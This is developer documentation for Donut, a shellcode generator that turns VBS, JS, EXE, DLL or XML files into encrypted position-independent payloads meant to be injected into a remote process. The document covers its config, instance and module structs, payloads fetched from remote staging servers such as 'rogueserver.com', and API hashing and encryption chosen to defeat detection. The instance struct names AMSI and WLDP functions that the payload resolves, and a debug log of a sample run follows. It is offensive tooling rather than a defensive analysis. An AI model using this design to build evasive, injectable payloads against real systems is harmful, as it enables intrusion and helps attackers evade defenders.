
<html>
<body>

<h3>API</h3>

<ul>
<li><code>int DonutCreate(PDONUT_CONFIG pConfig)</code></li>
<li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
</ul>

<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to execute a VBS/JS/EXE/DLL or XML file in-memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>

<ol>
  <li>An encrypted <var>Instance</var></li>
  <li>An encrypted <var>Module</var></li>
  <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
</ol>

<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote staging server.</p>

<h3>Configuration</h3>

<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a VBS/JS/EXE/DLL or XML file that will be executed in-memory by the shellcode, a namespace/class for a .NET assembly, including the name of a method to invoke and any parameters passed to the method. If the module will be stored on a staging server, a URL is required, but not a module name because that will be generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>    arch<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// target architecture for shellcode   </span>
    <span style='color:#800000; font-weight:bold; '>char</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of domain to create for assembly</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>     <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of method to execute</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   param<span style='color:#808030; '>[</span><span style='color:#808030; '>(</span>DONUT_MAX_PARAM<span style='color:#808030; '>+</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#808030; '>*</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters passed to method, separated by comma or semi-colon</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   file<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// assembly to create module from   </span>
    <span style='color:#800000; font-weight:bold; '>char</span>   url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// runtime version to use.</span>
    <span style='color:#800000; font-weight:bold; '>char</span>   modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// name of module written to disk</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>    mod_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// VBS/JS/EXE/DLL/XML</span>
    <span style='color:#603000; '>size_t</span> mod_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>void</span>   <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to donut module</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>    inst_type<span style='color:#800080; '>;</span>               <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
    <span style='color:#603000; '>size_t</span> inst_len<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>void</span>   <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// points to donut instance</span>
    
    <span style='color:#603000; '>size_t</span> pic_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span>   <span style='color:#808030; '>*</span>pic<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to PIC/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both x86 and amd64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly.</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory.</td>
  </tr>
  <tr>
    <td><code>param</code></td>
    <td>Contains a list of parameters for the .NET method. Each separated by semi-colon or comma.</td>
  </tr>
  <tr>
    <td><code>file</code></td>
    <td>The path of a supported file type: VBS/JS/EXE/DLL or XSL.</td>
  </tr>
  <tr>
    <td><code>url</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should contain the server and path of where module will be stored. e.g: https://www.rogueserver.com/modules/</td>
  </tr>
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for the .NET assembly. If none is provided, donut will read from meta header. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this will contain a randomly generated name for the module that should be used when saving the contents of <code>mod</code> to disk.</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of file detected by <code>DonutCreate</code>. <code>DONUT_MODULE_VBS</code> for example indicates a VBScript.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_PIC</code> indicates a self-contained payload which means the .NET assembly is embedded in executable code. <code>DONUT_INSTANCE_URL</code> indicates the .NET assembly is stored on a remote server with a URL embedded in the instance.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to executable code for the target architecture which also contains an instance. This should be injected into a remote process.</td>
  </tr>
</table>

<p>Everything that follows here concerns internal workings of Donut and is not required to generate a payload.</p>

<h3>Instance</h3>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_INSTANCE <span style='color:#800080; '>{</span>
    uint32_t    len<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// total size of instance</span>
    DONUT_CRYPT key<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// decrypts instance</span>
    <span style='color:#696969; '>// everything from here is encrypted</span>
    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>char</span>      s<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// amsi.dll</span>
      uint32_t  w<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> amsi<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        clr<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                       <span style='color:#696969; '>// clr.dll</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        wldp<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// wldp.dll</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        wldpQuery<span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// WldpQueryDynamicCodeTrust</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        wldpIsApproved<span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>           <span style='color:#696969; '>// WldpIsClassInApprovedList</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>        amsiInit<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// AmsiInitialize</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        amsiScanBuf<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// AmsiScanBuffer</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        amsiScanStr<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// AmsiScanString</span>
    
    uint16_t    wscript<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// WScript</span>
    uint16_t    wscript_exe<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// wscript.exe</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>         dll_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the number of DLL to load before resolving API</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        dll_name<span style='color:#808030; '>[</span>DONUT_MAX_DLL<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// a list of DLL strings to load</span>
    uint64_t    iv<span style='color:#800080; '>;</span>                           <span style='color:#696969; '>// the 64-bit initial value for maru hash</span>
    <span style='color:#800000; font-weight:bold; '>int</span>         api_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the 64-bit hashes of API required for instance to work</span>

    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      uint64_t  hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 64 api hashes</span>
      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 64 api addresses</span>
      <span style='color:#696969; '>// include prototypes only if header included from payload.h</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> PAYLOAD_H</span>
      <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
        <span style='color:#696969; '>// imports from kernel32.dll</span>
        LoadLibraryA_t             LoadLibraryA<span style='color:#800080; '>;</span>
        GetProcAddress_t           <span style='color:#400000; '>GetProcAddress</span><span style='color:#800080; '>;</span>
        GetModuleHandleA_t         GetModuleHandleA<span style='color:#800080; '>;</span>
        VirtualAlloc_t             <span style='color:#400000; '>VirtualAlloc</span><span style='color:#800080; '>;</span>             
        VirtualFree_t              <span style='color:#400000; '>VirtualFree</span><span style='color:#800080; '>;</span>  
        VirtualQuery_t             <span style='color:#400000; '>VirtualQuery</span><span style='color:#800080; '>;</span>
        VirtualProtect_t           <span style='color:#400000; '>VirtualProtect</span><span style='color:#800080; '>;</span>
        Sleep_t                    <span style='color:#400000; '>Sleep</span><span style='color:#800080; '>;</span>
        MultiByteToWideChar_t      <span style='color:#400000; '>MultiByteToWideChar</span><span style='color:#800080; '>;</span>
        GetUserDefaultLCID_t       <span style='color:#400000; '>GetUserDefaultLCID</span><span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from oleaut32.dll</span>
        SafeArrayCreate_t          SafeArrayCreate<span style='color:#800080; '>;</span>          
        SafeArrayCreateVector_t    SafeArrayCreateVector<span style='color:#800080; '>;</span>    
        SafeArrayPutElement_t      SafeArrayPutElement<span style='color:#800080; '>;</span>      
        SafeArrayDestroy_t         SafeArrayDestroy<span style='color:#800080; '>;</span>
        SafeArrayGetLBound_t       SafeArrayGetLBound<span style='color:#800080; '>;</span>        
        SafeArrayGetUBound_t       SafeArrayGetUBound<span style='color:#800080; '>;</span>        
        SysAllocString_t           SysAllocString<span style='color:#800080; '>;</span>           
        SysFreeString_t            SysFreeString<span style='color:#800080; '>;</span>
        LoadTypeLib_t              LoadTypeLib<span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from wininet.dll</span>
        InternetCrackUrl_t         InternetCrackUrl<span style='color:#800080; '>;</span>         
        InternetOpen_t             InternetOpen<span style='color:#800080; '>;</span>             
        InternetConnect_t          InternetConnect<span style='color:#800080; '>;</span>          
        InternetSetOption_t        InternetSetOption<span style='color:#800080; '>;</span>        
        InternetReadFile_t         InternetReadFile<span style='color:#800080; '>;</span>         
        InternetCloseHandle_t      InternetCloseHandle<span style='color:#800080; '>;</span>      
        HttpOpenRequest_t          HttpOpenRequest<span style='color:#800080; '>;</span>          
        HttpSendRequest_t          HttpSendRequest<span style='color:#800080; '>;</span>          
        HttpQueryInfo_t            HttpQueryInfo<span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from mscoree.dll</span>
        CorBindToRuntime_t         CorBindToRuntime<span style='color:#800080; '>;</span>
        CLRCreateInstance_t        CLRCreateInstance<span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from ole32.dll</span>
        CoInitializeEx_t           CoInitializeEx<span style='color:#800080; '>;</span>
        CoCreateInstance_t         CoCreateInstance<span style='color:#800080; '>;</span>
        CoUninitialize_t           CoUninitialize<span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
    <span style='color:#800080; '>}</span> api<span style='color:#800080; '>;</span>

    <span style='color:#603000; '>GUID</span>     xIID_IUnknown<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_IDispatch<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// GUID required to load .NET assemblies</span>
    <span style='color:#603000; '>GUID</span>     xCLSID_CLRMetaHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_ICLRMetaHost<span style='color:#800080; '>;</span>  
    <span style='color:#603000; '>GUID</span>     xIID_ICLRRuntimeInfo<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xCLSID_CorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_ICorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_AppDomain<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// GUID required to run VBS and JS files</span>
    <span style='color:#603000; '>GUID</span>     xCLSID_ScriptLanguage<span style='color:#800080; '>;</span>          <span style='color:#696969; '>// vbs or js</span>
    <span style='color:#603000; '>GUID</span>     xIID_IHost<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// wscript object</span>
    <span style='color:#603000; '>GUID</span>     xIID_IActiveScript<span style='color:#800080; '>;</span>             <span style='color:#696969; '>// engine</span>
    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptSite<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// implementation</span>
    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptParse32<span style='color:#800080; '>;</span>      <span style='color:#696969; '>// parser</span>
    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptParse64<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// GUID required to run XML files</span>
    <span style='color:#603000; '>GUID</span>     xCLSID_DOMDocument30<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_IXMLDOMDocument<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span>     xIID_IXMLDOMNode<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL </span>
    
    <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// staging server hosting donut module</span>
      <span style='color:#800000; font-weight:bold; '>char</span> req<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>             <span style='color:#696969; '>// just a buffer for "GET"</span>
    <span style='color:#800080; '>}</span> http<span style='color:#800080; '>;</span>

    uint8_t     sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// string to hash</span>
    uint64_t    mac<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// to verify decryption ok</span>
    
    DONUT_CRYPT mod_key<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// used to decrypt module</span>
    uint64_t    mod_len<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// total size of module</span>
    
    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      PDONUT_MODULE p<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for URL</span>
      DONUT_MODULE  x<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for PIC</span>
    <span style='color:#800080; '>}</span> module<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> DONUT_INSTANCE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_INSTANCE<span style='color:#800080; '>;</span>
</pre>

<h3>Module</h3>

<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>DWORD</span>   type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE, DLL, JS, VBS, XML</span>
    <span style='color:#603000; '>WCHAR</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
    <span style='color:#603000; '>WCHAR</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
    <span style='color:#603000; '>WCHAR</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
    <span style='color:#603000; '>WCHAR</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke for .NET DLL</span>
    <span style='color:#603000; '>DWORD</span>   param_cnt<span style='color:#800080; '>;</span>                              <span style='color:#696969; '>// number of parameters for DLL/EXE</span>
    <span style='color:#603000; '>WCHAR</span>   param<span style='color:#808030; '>[</span>DONUT_MAX_PARAM<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters for DLL/EXE</span>
    <span style='color:#603000; '>CHAR</span>    sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// random string to verify decryption</span>
    ULONG64 mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption was ok</span>
    ULONG64 len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of EXE/DLL/XML/JS/VBS file</span>
    <span style='color:#603000; '>BYTE</span>    data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// data of EXE/DLL/XML/JS/VBS file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h3>API Hashing</h3>

<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>

<h3>Encryption</h3>

<p>Chaskey is a 128-bit block cipher with support for 128-bit keys. Counter (CTR) mode turns the block cipher into a stream cipher that is then used to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut payload.</p>

<h3>Debugging payload</h3>

<p>The payload is capable of displaying detailed information about each step executing a file in-memory which can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
C:\hub\donut>donut -fClass1.dll -cTestClass -mRunProcess -pcalc.exe,notepad.exe

  [ Donut shellcode generator v0.9.2
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:838:DonutCreate(): Validating configuration and path of assembly
DEBUG: donut.c:854:DonutCreate(): Getting type of module
DEBUG: donut.c:320:GetModuleType(): Checking extension of Class1.dll
DEBUG: donut.c:322:GetModuleType(): Extension is "dll"
DEBUG: donut.c:327:GetModuleType(): Module is EXE or DLL
DEBUG: donut.c:274:GetTypePE(): Opening Class1.dll
DEBUG: donut.c:281:GetTypePE(): Mapping 3072 bytes for Class1.dll
DEBUG: donut.c:286:GetTypePE(): Checking DOS header
DEBUG: donut.c:288:GetTypePE(): Checking NT header
DEBUG: donut.c:290:GetTypePE(): Checking COM directory
DEBUG: donut.c:305:GetTypePE(): Unmapping
DEBUG: donut.c:309:GetTypePE(): Closing Class1.dll
DEBUG: donut.c:389:GetVersionFromFile(): Opening Class1.dll
DEBUG: donut.c:396:GetVersionFromFile(): Mapping 3072 bytes for Class1.dll
DEBUG: donut.c:401:GetVersionFromFile(): Reading IMAGE_COR20_HEADER
DEBUG: donut.c:404:GetVersionFromFile(): RVA : 00002008
DEBUG: donut.c:410:GetVersionFromFile(): PIMAGE_COR20_HEADER : 0000026B65A10208
DEBUG: donut.c:412:GetVersionFromFile(): RVA : 0000206c
DEBUG: donut.c:415:GetVersionFromFile(): RVA2OFS(rva=0000206c, ofs=000000000000026c)
DEBUG: donut.c:426:GetVersionFromFile(): Version : v4.0.30319
DEBUG: donut.c:427:GetVersionFromFile(): Closing Class1.dll
DEBUG: donut.c:867:DonutCreate(): Validating class and method for DLL
DEBUG: donut.c:873:DonutCreate(): Validating instance type
DEBUG: donut.c:892:DonutCreate(): Checking architecture
DEBUG: donut.c:901:DonutCreate(): Creating module
DEBUG: donut.c:499:CreateModule(): stat(Class1.dll)
DEBUG: donut.c:506:CreateModule(): Opening Class1.dll...
DEBUG: donut.c:514:CreateModule(): Allocating 9504 bytes of memory for DONUT_MODULE
DEBUG: donut.c:533:CreateModule(): Domain  : TW4HPNNP
DEBUG: donut.c:538:CreateModule(): Class   : TestClass
DEBUG: donut.c:541:CreateModule(): Method  : RunProcess
DEBUG: donut.c:389:GetVersionFromFile(): Opening Class1.dll
DEBUG: donut.c:396:GetVersionFromFile(): Mapping 3072 bytes for Class1.dll
DEBUG: donut.c:401:GetVersionFromFile(): Reading IMAGE_COR20_HEADER
DEBUG: donut.c:404:GetVersionFromFile(): RVA : 00002008
DEBUG: donut.c:410:GetVersionFromFile(): PIMAGE_COR20_HEADER : 0000026B65A10208
DEBUG: donut.c:412:GetVersionFromFile(): RVA : 0000206c
DEBUG: donut.c:415:GetVersionFromFile(): RVA2OFS(rva=0000206c, ofs=000000000000026c)
DEBUG: donut.c:426:GetVersionFromFile(): Version : v4.0.30319
DEBUG: donut.c:427:GetVersionFromFile(): Closing Class1.dll
DEBUG: donut.c:548:CreateModule(): Runtime : v4.0.30319
DEBUG: donut.c:565:CreateModule(): Adding "calc.exe"
DEBUG: donut.c:565:CreateModule(): Adding "notepad.exe"
DEBUG: donut.c:906:DonutCreate(): Creating instance
DEBUG: donut.c:614:CreateInstance(): Checking configuration
DEBUG: donut.c:632:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:638:CreateInstance(): Generating random key for encrypting instance
DEBUG: donut.c:643:CreateInstance(): Generating random key and signature for encrypting module
DEBUG: donut.c:651:CreateInstance(): Generated random string for signature : PFN6HTF7
DEBUG: donut.c:662:CreateInstance(): Allocating space for instance
DEBUG: donut.c:670:CreateInstance(): The size of module is 9504 bytes. Adding to size of instance.
DEBUG: donut.c:680:CreateInstance(): Setting the decryption key for instance
DEBUG: donut.c:683:CreateInstance(): Setting the decryption key for module
DEBUG: donut.c:687:CreateInstance(): Generating hashes for API using IV: 2db6c6d484e84ce4
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = B6E44E2CC763A592
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 4DD1D6F1D46F6992
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 6E8B72FD465B8225
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 1AD174A08D809070
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 9DF4FC42AA7533FA
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = 1D71AE5F24A5E7A6
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 7302D183648832CB
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : Sleep                  = 65E6E9499AC90BD8
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = B2A4F7DD6EAEB6F4
DEBUG: donut.c:701:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 3E1876D08DFDC1F
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = DF30EF9017CD4DAF
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 34E097D741D604AD
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = CDC685B2D3AEF24F
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = 12D4AE84222EEF0D
